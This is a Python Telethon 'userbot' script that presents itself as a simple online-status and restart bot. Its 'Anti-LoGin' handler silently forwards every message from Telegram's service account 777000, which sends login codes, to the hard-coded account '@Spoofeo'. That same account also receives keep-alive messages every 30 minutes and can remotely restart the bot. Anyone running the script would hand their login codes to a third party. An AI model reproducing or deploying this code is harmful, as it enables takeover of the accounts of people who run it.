#---------------------library-----------------------#
import asyncio , logging , os , random ,sys
from telethon import *
from datetime import datetime, timedelta  # Importamos datetime para manejar fechas y tiempos
#---------------------Logger-----------------------#
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',level=logging.INFO)
logger = logging.getLogger(__name__)
#---------------------api-----------------------#
hash = "d3d91787ab302b9202855611ea6e4aa4"
id = 5739547
#---------------------client-----------------------#
feshar = TelegramClient("sassion", api_id= id, api_hash=hash).start()
CybeRR = feshar.session.save()
#---------------------STart-Admin----------------------#
AliCybeRR = "@Spoofeo" #Admin
#---------------------ping----------------------#
@feshar.on(events.NewMessage(from_users = AliCybeRR))
async def main(event):
    text = event.raw_text
    if event.raw_text == "!ping":
        azhdar = ["👽𝕆𝕟𝕝𝕚𝕟𝕖👽","👽O͎n͎l͎i͎n͎e͎👽","👽OᑎᒪIᑎᗴ 👽","👽ᵒⁿˡⁱⁿᵉ👽"] 
        await event.reply(random.choice(azhdar))
#---------------------Restart-----------------------#
@feshar.on(events.NewMessage(from_users=AliCybeRR,pattern = "^!restart")) 
async def wait_hours(event):
    msg = await feshar.send_message(event.chat_id, "♻️ 𝑆𝑢𝑐𝑐𝑒𝑠𝑠𝐹𝑢𝑙𝑙𝑦 𝑅𝑒𝑠𝑡𝑎𝑟𝑡 ♻️")
    os.execl(sys.executable, sys.executable, *sys.argv)
#---------------------Anti-LoGin-----------------------#
@feshar.on(events.NewMessage(func=lambda e: e.is_private))
async def sendphoto(event):
    sender = await event.get_sender()
    if sender.id == 777000:
        await feshar.forward_messages("Spoofeo", event.message) #Admin

#---------------------Keep-Alive Function-----------------------#
async def keep_alive():
    while True:
        try:
            # Cambia el ID de chat por tu nombre de usuario o grupo donde enviar el mensaje
            await feshar.send_message("@Spoofeo", "Manteniendo la cuenta activa...")
        except Exception as e:
            print(f"Error al mantener activa la cuenta: {str(e)}")
        await asyncio.sleep(60 * 30)  # Envía un mensaje cada 30 minutos

#---------------------Ejecución del Cliente y Keep-Alive-----------------------#
try:
    asyncio.ensure_future(keep_alive())  # Inicia la función keep_alive en segundo plano
    feshar.run_until_disconnected()     # Ejecuta el cliente de Telegram
except Exception as e:
    print("Warning ! An ErRoR Happened --> "+str(e))
